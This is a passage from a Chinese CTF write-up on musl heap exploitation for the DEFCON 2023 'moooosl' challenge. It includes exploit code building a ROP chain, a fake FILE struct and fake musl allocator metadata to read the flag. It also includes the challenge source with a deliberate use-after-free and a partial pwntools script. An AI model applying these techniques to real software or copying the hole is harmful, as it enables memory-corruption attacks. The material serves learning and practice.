libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目为<code>defcon 2023 moooosl</code><br>musl版本为1.2.2</p><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>赛题好像没有给出源码，不过代码比较简单，<code>ida</code>看的反而比源码更加方便，这里为了方便看的人了解题目，就把源码贴出来了<br>h.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> H[<span class="number">0x100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">uint32_t</span> shift = rand();</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R 0x7f</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> a = L; a &lt; R; a++) &#123;</span><br><span class="line">        tmp[<span class="number">0</span>] = a;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> b = L; b &lt; R; b++) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c = L; c &lt; R; c++) &#123;</span><br><span class="line">                tmp[<span class="number">2</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> d = L; d &lt; R; d++) &#123;</span><br><span class="line">                    tmp[<span class="number">3</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">char</span> e = L; e &lt; R; e++) &#123;</span><br><span class="line">                        tmp[<span class="number">4</span>] = e;</span><br><span class="line">                        <span class="type">uint32_t</span> h = key_hash(&amp;tmp, <span class="number">5</span>) - shift;</span><br><span class="line">                        <span class="keyword">if</span> (h &lt; <span class="number">0x100000</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (H[h] == <span class="number">0</span>) &#123;</span><br><span class="line">                                H[h] = *(<span class="type">uint64_t</span> *)&amp;tmp;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;%s %s =&gt; %#08x\n&quot;</span>, tmp, &amp;H[h], h);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recvuntil</span><span class="params">(<span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">if</span> (read(<span class="number">0</span>, &amp;c, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">char</span> *)buf)[i] = c;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            ((<span class="type">char</span> *)buf)[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">readint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    recvuntil(&amp;buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_key</span><span class="params">(<span class="type">uint8_t</span> **key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> key_size = readint();</span><br><span class="line">    *key = <span class="built_in">calloc</span>(<span class="number">1</span>, key_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*key, key_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_value</span><span class="params">(<span class="type">uint8_t</span> **value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> value_size = readint();</span><br><span class="line">    *value = <span class="built_in">calloc</span>(<span class="number">1</span>, value_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*value, value_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> *key;</span><br><span class="line">    <span class="type">uint8_t</span> *value;</span><br><span class="line">    <span class="type">size_t</span> key_size;</span><br><span class="line">    <span class="type">size_t</span> value_size;</span><br><span class="line">    <span class="type">uint64_t</span> hash;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">// struct node *prev;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">2021</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">value_dump</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MASK (HASH_SIZE - 1)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">list_heads</span>[<span class="title">HASH_SIZE</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: query&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;option: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> node *<span class="title function_">lookup</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = key_hash(key, key_size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">struct</span> node *n = list_heads[h &amp; HASH_MASK]; n; n = n-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n-&gt;hash == h &amp;&amp; n-&gt;key_size == key_size &amp;&amp; !<span class="built_in">memcmp</span>(key, n-&gt;key, key_size)) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">node</span> =</span> <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">    node-&gt;key_size = read_key(&amp;node-&gt;key);</span><br><span class="line">    <span class="comment">// always insert to the head, don&#x27;t check duplicated entries</span></span><br><span class="line">    node-&gt;value_size = read_value(&amp;node-&gt;value);</span><br><span class="line">    node-&gt;hash = key_hash(node-&gt;key, node-&gt;key_size);</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> h = node-&gt;hash &amp; HASH_MASK;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span> =</span> list_heads[h];</span><br><span class="line">    list_heads[h] = node;</span><br><span class="line">    node-&gt;next = next;</span><br><span class="line">    <span class="comment">// node-&gt;prev = NULL;</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">query</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value_dump(n-&gt;value, n-&gt;value_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> node **p = &amp;list_heads[n-&gt;hash &amp; HASH_MASK];</span><br><span class="line">        <span class="keyword">if</span> (*p == n || n-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// above condition is buggy</span></span><br><span class="line">            <span class="comment">// remove `n` from the linked list</span></span><br><span class="line">            <span class="keyword">while</span> (*p != n) &#123;</span><br><span class="line">                p = &amp;(*p)-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            *p = n-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// uaf: if `n` is at the tail of the linked list</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;value);</span><br><span class="line">        <span class="built_in">free</span>(n);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> op = readint();</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                store();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                query();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>很好，一做题就废，跟着<code>sung3r</code>师傅的文章才一步一步的复现出来，这里就对<code>sung3r</code>的文章进行部分补充<br>需要注意：需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code><br>可以看到<code>query()</code>函数每次打印的数据是该哈希链表最外侧结点的数据，而插入结点则是将结点插入最内侧<br>可以看到<code>delete()</code>函数当<code>n</code>为哈希链表的尾部且该哈希链表的结点个数大于一个时，会跳过循环直接进行<code>free</code>，存在<code>UAF</code>漏洞<br>每次<code>store</code>时，都会申请<code>0x30</code>大小的空间来存储改结点的信息，该空间结构为：</p><img src="/2024/01/17/musl/6.png" class="" title="我的图图呢">  <p>交互脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span 